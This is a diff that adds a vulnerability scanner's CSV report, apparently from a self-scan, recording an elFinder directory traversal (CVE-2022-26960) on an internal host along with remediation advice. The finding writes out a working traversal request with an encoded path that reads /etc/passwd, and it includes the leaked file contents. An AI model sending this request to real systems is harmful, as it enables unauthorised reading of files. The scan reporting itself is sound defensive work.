@@ -1,0 +1,39 @@
+IP,Hostname,Port,Port Protocol,CVSS,Severity,QoD,Solution Type,NVT Name,Summary,Specific Result,NVT OID,CVEs,Task ID,Task Name,Timestamp,Result ID,Impact,Solution,Affected Software/OS,Vulnerability Insight,Vulnerability Detection Method,Product Detection Result,BIDs,CERTs,Other References
+192.168.20.58,fedora,8080,tcp,9.1,Critical,100,VendorFix,elFinder < 2.1.61 Directory Traversal Vulnerability - Active Check,elFinder is prone to a directory traversal vulnerability.,"By doing the following HTTP request:
+
+Affected URL : http://fedora:8080/php/connector.minimal.php?cmd=file&target=l1_L3Zhci93d3cvaHRtbC9waHAvLi4vZmlsZXMvLy4uLy8uLi8vLi4vLy4uLy8uLi8vLi4vZXRjL3Bhc3N3ZA==&download=1
+HTTP Method  : GET
+
+it was possible to obtain the file ""/etc/passwd"" from the target host.
+
+Result:
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+",1.3.6.1.4.1.25623.1.0.148379,CVE-2022-26960,d2b20ac5-3610-43d6-b83d-1f3aa7048376,self-scan,2026-11-03T19:40:16Z,6e5d29c9-ce53-4e30-9181-494930e82a8e,"Unauthenticated remote attackers may read, write and browse
+  files outside the configured document root.",Update to version 2.1.61 or later.,elFinder version 2.1.60 and prior.,"connector.minimal.php is affected by a path traversal due to
+  improper handling of absolute file paths.","Sends multiple crafted HTTP GET requests and checks the
+  responses.
+Details:
+elFinder < 2.1.61 Directory Traversal Vulnerability - Active Check
+(OID: 1.3.6.1.4.1.25623.1.0.148379)
+Version used: 2026-04-30T06:27:06Z
+",,,,
